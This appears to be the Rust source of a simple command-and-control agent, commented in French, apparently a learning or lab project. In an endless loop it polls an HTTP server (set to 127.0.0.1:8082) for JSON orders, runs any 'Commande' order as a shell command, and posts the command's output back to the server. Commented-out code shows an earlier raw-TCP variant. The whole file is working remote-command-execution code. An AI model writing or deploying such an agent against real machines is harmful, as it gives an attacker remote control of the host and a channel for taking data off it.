use std::io::prelude::*;
use std::net::TcpStream;
use std::time::Duration;
use std::{thread, time};
use std::process::{Command, Output};
use std::io::Write;
use reqwest::{self, Result};
use serde::{Serialize, Deserialize};


//Exemple utilisation de la commande
// let vecteur = vec!["-a".to_string(), "-l".to_string()];
// exec_commande_shell(String::from("ls"), vecteur);
fn exec_commande_shell(command : String, args : Vec<String>) -> std::io::Result<Command> {
    let mut base_command = Command::new(command);
    if args.len() > 0 {
        for i in 0..args.len() {
            base_command.arg(args[i].clone());
        }
    }
    //base_command.output().expect("error executing command");
    base_command.status();
    //base_command.output();

    return Ok(base_command);      
}


#[derive(Serialize, Deserialize, Debug)]
enum OrdreType {
    Commande,
    Endormir,
    Autre
}

#[derive(Serialize, Deserialize, Debug)]
struct Ordre {
    ordre: OrdreType,
    arguments: Vec<String>,
}


#[tokio::main]
async fn sending_request() -> std::io::Result<()>{

    let client = reqwest::Client::builder()
    // .timeout(Duration::from_millis(3000))
    .build().unwrap();

    let response = client.get("http://127.0.0.1:8082")
    .body(String::from("Waiting for instructions"))
    .send()
    .await;

    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("Success!");
                    // println!("{}", v.text().await.unwrap());

                    let texte : String = v.text().await.unwrap();
                    let contenu : std::result::Result<Ordre, serde_json::Error> = serde_json::from_str(&texte);

                    match contenu {
                       Ok(v) => {

                            match v.ordre {
                                OrdreType::Commande => {
                                    let command_args = v.arguments[1..].to_vec();
                                    let command_name = v.arguments.get(0).unwrap().clone();

                                    let result_command = exec_commande_shell(command_name, command_args);

                                    match result_command{
                                        Ok(mut v) => sending_request_with_result(v.output().expect("error")).await?,
                                        Err(_) => println!("erreur")
                                    };
                                },
                                _ => {
                                    println!("Ordre non implémenté");
                                }
                            }

                       },
                       Err(_) => {
                            println!("Erreur de lecture de l'ordre");
                       }
                    }

                },
                reqwest::StatusCode::UNAUTHORIZED => {
                    println!("Need to grab a new token");
                },
                reqwest::StatusCode::REQUEST_TIMEOUT => {
                    println!("Request Timeout");
                },
                e => {
                    panic!("Uh oh! Something unexpected happened.   :   {:?}", e);
                }
            };
        },
        Err(_err) => println!("Pas de Connexion")
    };

    let time = time::Duration::from_millis(2000);
    thread::sleep(time);
    return Ok(());
}

// fn sending_request_with_result(result_command : Command) -> std::io::Result<()>{
//     let mut stream = TcpStream::connect("127.0.0.1:7878")?;
//     stream.write(&[1])?;
//     stream.read(&mut [0; 128])?;
//     stream.write(result_command.output());
//     // let time = time::Duration::from_millis(1000);
//     // thread::sleep(time);
//     return Ok(());
// }

// fn construct_headers() -> Headers {
//     let mut headers = Headers::new();
//     headers.set(UserAgent::new("reqwest"));
//     headers.set(ContentType::png());
//     headers
// }

// #[tokio::main]
async fn sending_request_with_result(result_command : Output) -> std::io::Result<()> {
    let client = reqwest::Client::new();
    let response = client.post("http://127.0.0.1:8082")
    .body(String::from_utf8(result_command.stdout).unwrap())
    .send()
    .await;
    //let response = reqwest::get("http://127.0.0.1:8082").await;
    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("Success!");
                    println!("{}", v.text().await.unwrap());
                },
                reqwest::StatusCode::UNAUTHORIZED => {
                    println!("Need to grab a new token");
                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(_err) => ()
    };
    return Ok(());
}



fn main() {

    let boucle : bool = true;
    while boucle {
        sending_request();
    }

    //sending_request();
    // let vecteur = vec!["-a".to_string(), "-l".to_string()];
    // let result_command = exec_commande_shell(String::from("ls"), vecteur);
    // match result_command{
    //     Ok(mut v) => sending_request_with_result(v.output().expect("error")),
    //     Err(err) => Err(err)
    // };
   // sending_request()
}
